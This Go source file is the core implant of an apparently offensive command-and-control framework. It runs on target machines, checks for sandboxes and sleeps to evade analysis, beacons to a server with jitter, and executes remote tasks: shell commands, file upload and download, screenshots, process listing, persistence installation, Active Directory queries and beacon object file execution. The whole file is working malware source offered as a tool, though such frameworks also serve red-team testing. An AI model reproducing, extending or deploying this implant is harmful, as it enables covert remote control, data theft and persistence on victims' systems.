package implant

import (
	"crypto/rsa"
	"os"
	"strconv"

	"github.com/phantom-c2/phantom/internal/protocol"
)

// chdir and getwd wrappers for cross-platform compatibility.
func chdir(path string) error { return os.Chdir(path) }
func getwd() (string, error) { return os.Getwd() }

// Implant is the core agent that runs on target systems.
type Implant struct {
	transport *Transport
	sleep     int
	jitter    int
	killDate  string
	results   []protocol.TaskResult
}

// Run is the main entry point for the implant.
// It handles registration, check-in loop, and task execution.
func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, killDate string) {
	imp := &Implant{
		transport: NewTransport(serverURL, serverPub),
		sleep:     sleepSec,
		jitter:    jitterPct,
		killDate:  killDate,
	}

	// Sandbox check
	if CheckSandbox() {
		// Sleep longer to evade analysis timeouts
		SleepWithJitter(300, 50)
	}

	// Kill date check
	if CheckKillDate(killDate) {
		return
	}

	// Collect system info
	sysinfo := CollectSysInfo()

	// Registration loop (retry until successful)
	for {
		if CheckKillDate(imp.killDate) {
			return
		}

		err := imp.transport.Register(sysinfo)
		if err == nil {
			break
		}

		// Retry after sleep
		SleepWithJitter(imp.sleep, imp.jitter)
	}

	// Main check-in loop
	for {
		if CheckKillDate(imp.killDate) {
			return
		}

		SleepWithJitter(imp.sleep, imp.jitter)

		// Check in and get tasks
		tasks, err := imp.transport.CheckIn(imp.results)
		imp.results = nil // Clear sent results

		if err != nil {
			// Connection failed, keep trying
			continue
		}

		// Execute tasks
		for _, task := range tasks {
			result := imp.executeTask(task)
			if result != nil {
				imp.results = append(imp.results, *result)
			}

			// Check for kill command
			if task.Type == protocol.TaskKill {
				return
			}
		}
	}
}

// executeTask dispatches a task to the appropriate handler.
func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
	result := &protocol.TaskResult{
		TaskID:  task.ID,
		AgentID: imp.transport.GetAgentID(),
	}

	var output []byte
	var err error

	switch task.Type {
	case protocol.TaskShell:
		output, err = ExecuteShell(task.Args)

	case protocol.TaskUpload:
		if len(task.Args) > 0 && len(task.Data) > 0 {
			output, err = UploadFile(task.Args[0], task.Data)
		} else {
			err = errMissingArgs("upload requires remote path and file data")
		}

	case protocol.TaskDownload:
		if len(task.Args) > 0 {
			output, err = DownloadFile(task.Args[0])
		} else {
			err = errMissingArgs("download requires remote path")
		}

	case protocol.TaskScreenshot:
		output, err = CaptureScreenshot()

	case protocol.TaskProcessList:
		output, err = ListProcesses()

	case protocol.TaskSysinfo:
		output = []byte(DetailedSysInfo())

	case protocol.TaskPersist:
		if len(task.Args) > 0 {
			output, err = InstallPersistence(task.Args[0])
		} else {
			err = errMissingArgs("persist requires method name")
		}

	case protocol.TaskSleep:
		if len(task.Args) >= 1 {
			if s, e := strconv.Atoi(task.Args[0]); e == nil && s > 0 {
				imp.sleep = s
			}
			if len(task.Args) >= 2 {
				if j, e := strconv.Atoi(task.Args[1]); e == nil && j >= 0 {
					imp.jitter = j
				}
			}
			output = []byte("Sleep updated")
		}

	case protocol.TaskCd:
		if len(task.Args) > 0 {
			output, err = ChangeDirectory(task.Args[0])
		} else {
			err = errMissingArgs("cd requires path")
		}

	case protocol.TaskAD:
		if len(task.Args) > 0 {
			adCmds := GetADCommands()
			if adCmd, ok := adCmds[task.Args[0]]; ok {
				output, err = adCmd.Executor(task.Args[1:])
			} else {
				err = errMissingArgs("unknown AD command: " + task.Args[0])
			}
		} else {
			err = errMissingArgs("ad requires command name")
		}

	case protocol.TaskBOF:
		if len(task.Data) > 0 {
			var bofArgs []byte
			if len(task.Args) > 0 {
				bofArgs = PackBOFArgs(NewBOFStringArg(task.Args[0]))
			}
			output, err = ExecuteBOF(task.Data, bofArgs)
		} else {
			err = errMissingArgs("bof requires object file data")
		}

	case protocol.TaskKill:
		output = []byte("Agent terminating")

	default:
		err = errMissingArgs("unknown task type")
	}

	if err != nil {
		result.Error = err.Error()
	}
	result.Output = output

	return result
}

type missingArgsError struct{ msg string }

func (e *missingArgsError) Error() string { return e.msg }

func errMissingArgs(msg string) error {
	return &missingArgsError{msg: msg}
}
